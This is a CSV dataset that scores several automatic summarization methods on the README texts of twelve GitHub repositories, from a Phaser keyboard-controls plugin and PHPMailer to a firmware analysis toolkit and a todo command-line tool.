,id,link,summary,lex_rank,edmunson,lead_cm,prsummarizer,lead_cm score,prsummarizer score
0,136617793,https://api.github.com/repos/AllenWangle/Research-Line,"A paper list of my research line, welcome to discuss with me.",ai magazine 2008. other useful datasets link citation dataset httpslinqs.soe.ucsc.edudata heteregeneous graph datasets imdb datasets movielens latest dataset which consists of 33000 movies.,awesome paper list a collection of graph embedding deep learning recommendation knowledge graph heterogeneous graph papers with reference implementations you need to zoom in on this image to view this picture.,awesome paper list a collection of graph embedding deep learning recommendation knowledge graph heterogeneous graph papers with reference implementations you need to zoom in on,collection of graph list of graph embedding recommendation knowledge graph graph papers to zoom in on this image to view,0.19923,0.16805666666666666
1,136860222,https://api.github.com/repos/heikipikker/firmware-analysis-toolkit,Toolkit to emulate firmware and analyse it for security vulnerabilities ,install binwalk note alternatively you could also do a setting up firmadyne edit and make the point to the current location of firmadyne folder.,firmware analysis toolkit fat is a toolkit built in order to help security researchers analyze and identify vulnerabilities in iot and embedded device firmware.,firmware analysis toolkit fat is a toolkit built in order to help security researchers analyze and identify vulnerabilities in iot and embedded device firmware. this,toolkit built in order to help security researchers analyze and identify vulnerabilities in iot and embedded device firmware,0.19047666666666666,0.23809333333333335
2,136792496,https://api.github.com/repos/shaunagm/governance-resources,Resources to help you choose a governance system for your project,project governance docs full case study rust rust rfc 1068 openstack openstack governance jupyter jupyter goverance doc django organization of the django project astropy astropy team nodejs project governance openhumans governance general governance resources below is a list of articles conference talks books and other resources which address governance in open andor technical communities.,governance resources welcome to governance resources.,governance resources welcome to governance resources. our goal is to help open communities adopt and maintain governance structures that work for them. the project has,welcome to help open communities adopt structures for them,0.24183000000000002,0.23703666666666665
3,136898852,https://api.github.com/repos/srmagura/expo-pixi,Tools for using pixi.js in Expo,sideeffects to use pixi.js with expo react native you will want to import a modified version of pixi.js like so now you can create a new application the way you would on the web but be sure to pass in a .,expopixi tools to use pixi.js in expo to get started in your expo project and import it with .,expopixi tools to use pixi.js in expo to get started in your expo project and import it with . sideeffects to use pixi.js with expo,tools to use pixijs in your expo project and import it with sideeffects to get started,0.2665366666666667,0.17391333333333334
4,136699628,https://api.github.com/repos/tenfinney/graphql-relay-js,A library to help construct a graphql-js server supporting react-relay.,connections helper functions are provided for both building the graphql types for connections and for implementing the method for fields returning those types.,relay library for graphql.js this is a library to allow the easy creation of relaycompliant servers using the graphql.js reference implementation of a graphql server.,relay library for graphql.js this is a library to allow the easy creation of relaycompliant servers using the graphql.js reference implementation of a graphql server.,library to allow install relay creation of relaycompliant servers with the graphqljs reference implementation,0.31139,0.20726333333333335
5,136778514,https://api.github.com/repos/RetroVX/phaser3-controls-plugin,A simple plugin to assist with creating control schemes with keyboard inputs for Phaser 3,phaser 3 controls plugin a simple plugin to assist with creating control schemes and combos with keyboard inputs for phaser 3 demo httpsretrovx.github.iophaser3controlsplugin getting started prerequisites phaser 3.16 install or download from zip install as a global scene plugin use phasercontrolsplugin.js or phasercontrolsplugin.min.js game config levelscene.js or import into a phaser scene use phasercontrols.js or phasercontrols.min.js config phaser 3 keycodes docs examples add new control scheme add multiple control schemes access controls access control schemes create wasd keys wasd shift space or cursor keys up down left right shift space get control scheme object select control scheme to use javascript scheme pass in either the control scheme name string or object this.controls.setactivescheme or javascript scheme pass in either the control scheme name string or object this.controls.switchscheme edit control scheme javascript let getscheme this.controls.getazerty scheme object string pass in control scheme to edit config object config to replace chosen control scheme this.controls.editgetscheme name azertyedit active false controls up z down s left q right d shift shift space space delete control scheme javascript delete control scheme scheme pass in either control scheme name string or object destroy phaser v3.16 boolean removes keys and removes captures this.controls.deletescheme destroy enable keys javascript enables keys from active control scheme this.controls.enablekeys disable keys javascript disables keys from active control scheme this.controls.disablekeys create a key combo basic example javascript config options const comboconfig combo aa the combo to use name optional name to reference by if needed data optional data to pass into the combo event resetonmatch true optional reset the combo on match default false maxkeydelay 450 optional the delay between key presses if longer then it resets the combo default 0 deleteonmatch false optional delete the combo when the combo is complete default false schemes mycontrolscheme1 controlscheme2 optional control schemes that use this combo default global onmatch functionscene event function to call when the combo is a match onmatchonce functionscene event same as onmatch but only runs once create the combo to dash player left let dashleft this.controls.createcombo combo aa onmatch functionscene scene.player.x 100 create a combo that only works if yourcontrolscheme is active let dashleftwasd this.controls.createcombo combo aa schemes yourcontrolscheme onmatch functionscene scene.player.x 100 delete combo dashleft.delete create the konami code javascript this.controls.createkonamicodefunctionscene window.alert30 lives record player key inputs javascript use inside the update function this.controls.recordkeys returns an array with an object for each key pressed the object contains key keycode duration the key was down timestamp of when the key was down convert a keycode to a key javascript a helper function to input a keycode or an array of keycodes and convert them to phaser key strings this.controls.keycodetokey37 returns left this.controls.keycodetokey37 39 returns left right debug control scheme text javascript setup debug controls text click on text to switch to next control scheme x y fontsize font color this.controls.debugtext200 200 20 000000 levelscene.js example javascript export default class levelscene extends phaser.scene constructor super preload this.load.imageplayer assetsplayer.png create this.player this.add.sprite400 400 player const config name cursorkeys active true controls up up down down left left right right shift shift space space attack z this.controls.addconfig where the current keys are stored this.controls.keys this.controls.keys.up this.controls.keys.down this.controls.keys.left this.controls.keys.right this.controls.keys.shift this.controls.keys.space this.controls.keys.attack updatetime delta ifthis.controls.keys.up.isdown this.player.y 4 else ifthis.controls.keys.down.isdown this.player.y 4 ifthis.controls.keys.left.isdown this.player.x 4 else ifthis.controls.keys.right.isdown this.player.x 4 ifthis.controls.keys.space.isdown do something else ifthis.controls.keys.attack.isdown do something else todo create more examples made with phaser.io,phaser 3 controls plugin a simple plugin to assist with creating control schemes and combos with keyboard inputs for phaser 3 demo httpsretrovx.github.iophaser3controlsplugin getting started prerequisites phaser 3.16 install or download from zip install as a global scene plugin use phasercontrolsplugin.js or phasercontrolsplugin.min.js game config levelscene.js or import into a phaser scene use phasercontrols.js or phasercontrols.min.js config phaser 3 keycodes docs examples add new control scheme add multiple control schemes access controls access control schemes create wasd keys wasd shift space or cursor keys up down left right shift space get control scheme object select control scheme to use javascript scheme pass in either the control scheme name string or object this.controls.setactivescheme or javascript scheme pass in either the control scheme name string or object this.controls.switchscheme edit control scheme javascript let getscheme this.controls.getazerty scheme object string pass in control scheme to edit config object config to replace chosen control scheme this.controls.editgetscheme name azertyedit active false controls up z down s left q right d shift shift space space delete control scheme javascript delete control scheme scheme pass in either control scheme name string or object destroy phaser v3.16 boolean removes keys and removes captures this.controls.deletescheme destroy enable keys javascript enables keys from active control scheme this.controls.enablekeys disable keys javascript disables keys from active control scheme this.controls.disablekeys create a key combo basic example javascript config options const comboconfig combo aa the combo to use name optional name to reference by if needed data optional data to pass into the combo event resetonmatch true optional reset the combo on match default false maxkeydelay 450 optional the delay between key presses if longer then it resets the combo default 0 deleteonmatch false optional delete the combo when the combo is complete default false schemes mycontrolscheme1 controlscheme2 optional control schemes that use this combo default global onmatch functionscene event function to call when the combo is a match onmatchonce functionscene event same as onmatch but only runs once create the combo to dash player left let dashleft this.controls.createcombo combo aa onmatch functionscene scene.player.x 100 create a combo that only works if yourcontrolscheme is active let dashleftwasd this.controls.createcombo combo aa schemes yourcontrolscheme onmatch functionscene scene.player.x 100 delete combo dashleft.delete create the konami code javascript this.controls.createkonamicodefunctionscene window.alert30 lives record player key inputs javascript use inside the update function this.controls.recordkeys returns an array with an object for each key pressed the object contains key keycode duration the key was down timestamp of when the key was down convert a keycode to a key javascript a helper function to input a keycode or an array of keycodes and convert them to phaser key strings this.controls.keycodetokey37 returns left this.controls.keycodetokey37 39 returns left right debug control scheme text javascript setup debug controls text click on text to switch to next control scheme x y fontsize font color this.controls.debugtext200 200 20 000000 levelscene.js example javascript export default class levelscene extends phaser.scene constructor super preload this.load.imageplayer assetsplayer.png create this.player this.add.sprite400 400 player const config name cursorkeys active true controls up up down down left left right right shift shift space space attack z this.controls.addconfig where the current keys are stored this.controls.keys this.controls.keys.up this.controls.keys.down this.controls.keys.left this.controls.keys.right this.controls.keys.shift this.controls.keys.space this.controls.keys.attack updatetime delta ifthis.controls.keys.up.isdown this.player.y 4 else ifthis.controls.keys.down.isdown this.player.y 4 ifthis.controls.keys.left.isdown this.player.x 4 else ifthis.controls.keys.right.isdown this.player.x 4 ifthis.controls.keys.space.isdown do something else ifthis.controls.keys.attack.isdown do something else todo create more examples made with phaser.io,phaser 3 controls plugin a simple plugin to assist with creating control schemes and combos with keyboard inputs for phaser 3 demo httpsretrovx.github.iophaser3controlsplugin getting started,simple plugin to assist with creating control schemes and combos with keyboard inputs,0.69286,0.7545766666666666
6,136707509,https://api.github.com/repos/HFsi/circle-sensor-card,A custom component for displaying sensor values as cards or elements,custom component for lovelace which can be used as a card or an element on a pictureelements card.,custom component for lovelace which can be used as a card or an element on a pictureelements card.,custom component for lovelace which can be used as a card or an element on a pictureelements card. note when including this file in your,custom component for writing which can be used as a card or an element on a pictureelements,0.3366,0.43406666666666666
7,136896540,https://api.github.com/repos/octraits/IDE_FOR_BLIND,In order to deal with various problems discussed above this project helps in providing the needs of the blind to help them earn a basic earning through the use of a useful skill. Project helps the person with sight disability in coding with Python languag,this project consist of a text editor dedicated input window descriptive output window list box with autocomplete suggestions dedicated hotkeys binded with different keyboard shortcuts for various functions like complie autocomplete code in speech format save open file etc.,contents introduction problem statement methodology results conclusion and future work references introduction sustainability is the development that satisfies the needs of the present without compromising the capacity of future generations guaranteeing the balance between economic growth care for the environment and social wellbeing.,contents introduction problem statement methodology results conclusion and future work references introduction sustainability is the development that satisfies the needs of the present without compromising,methodology for testing and sustainable the environment and achieve generations,0.13417333333333334,0.02424
8,136738264,https://api.github.com/repos/vatann07/BloodConnect,"Repository to save cloud project \BloodConnect\""""",phpmailer a fullfeatured email creation and transfer class for php build status class features probably the worlds most popular code for sending email from php used by many opensource projects wordpress drupal 1crm sugarcrm yii joomla and many more integrated smtp support send without a local mail server send emails with multiple to cc bcc and replyto addresses multipartalternative emails for mail clients that do not read html email add attachments including inline support for utf8 content and 8bit base64 binary and quotedprintable encodings smtp authentication with login plain crammd5 and xoauth2 mechanisms over ssl and smtpstarttls transports validates email addresses automatically protect against header injection attacks error messages in 47 languages dkim and smime signing support compatible with php 5.5 and later namespaced to prevent name clashes much more why you might need it many php developers utilize email in their code.,phpmailer a fullfeatured email creation and transfer class for php build status class features probably the worlds most popular code for sending email from php used by many opensource projects wordpress drupal 1crm sugarcrm yii joomla and many more integrated smtp support send without a local mail server send emails with multiple to cc bcc and replyto addresses multipartalternative emails for mail clients that do not read html email add attachments including inline support for utf8 content and 8bit base64 binary and quotedprintable encodings smtp authentication with login plain crammd5 and xoauth2 mechanisms over ssl and smtpstarttls transports validates email addresses automatically protect against header injection attacks error messages in 47 languages dkim and smime signing support compatible with php 5.5 and later namespaced to prevent name clashes much more why you might need it many php developers utilize email in their code.,phpmailer a fullfeatured email creation and transfer class for php build status class features probably the worlds most popular code for sending email from php,fullfeatured email creation and transfer class for [UNK] build status class,0.0,0.0
9,136862348,https://api.github.com/repos/ssfdust/todo-cli,✅ Command-line tool to manage Todo lists,you can now start adding tasks commands create a project delete a project rename a project add a task remove a task check a task uncheck a task toggle a task list all tasks search tasks create a project delete a project you can use instead of .,todo cli commandline tool to manage the todo lists of your projects built with python3 with unix systems in mind.,todo cli commandline tool to manage the todo lists of your projects built with python3 with unix systems in mind. elevator pitch todo exists to,tool to manage the todo lists of your projects built with python3,0.275,0.4685266666666667
10,136907520,https://api.github.com/repos/balika011/mtgatracker,"MTGATracker is a deck tracker for MTG Arena, offering an in-game overlay that shows real time info about your deck in MTGA. It can also record & analyze your past matches to show personal aggregated gameplay history information, like lifetime wins/losses ",mtgatracker mtga tracker is an electronbased app that helps you track your mtga decks im not reading anything else until you tell me how to use it i figured as much.,mtgatracker mtga tracker is an electronbased app that helps you track your mtga decks im not reading anything else until you tell me how to use it i figured as much.,mtgatracker mtga tracker is an electronbased app that helps you track your mtga decks im not reading anything else until you tell me how to,electronbased is an electronbased app to track you track your mtga,0.1592066666666667,0.11320999999999999
11,137599506,https://api.github.com/repos/indiegogo/vuex-module-validatable-state,Simple Vuex module to handle form fields and validations,action nameruns actiontypes.setfieldset value for a field then runs validation if enabled actiontypes.setfieldsbulkset values for fields at once then make all dirtiness flags false actiontypes.resetfieldsreset values on field with initial values actiontypes.enableallvalidationsenable interactive validation and run validations for all fields actiontypes.validatefieldvaluevalidate specific field actiontypes.validatefieldsvalidate all fields actiontypes.setfieldseditabilityset editability flag for a field disabled field is not updated nor validated actiontypes.setfieldspristinemake all dirtiness flags false validators you can pass validators when you initialize the module.,vuexmodulevalidatablestate simple vuex module to handle form fields and validations.,vuexmodulevalidatablestate simple vuex module to handle form fields and validations. you can build a view model for your form which runs valdations easily. you just,simple module to handle form fields and validations,0.5196066666666667,0.89412
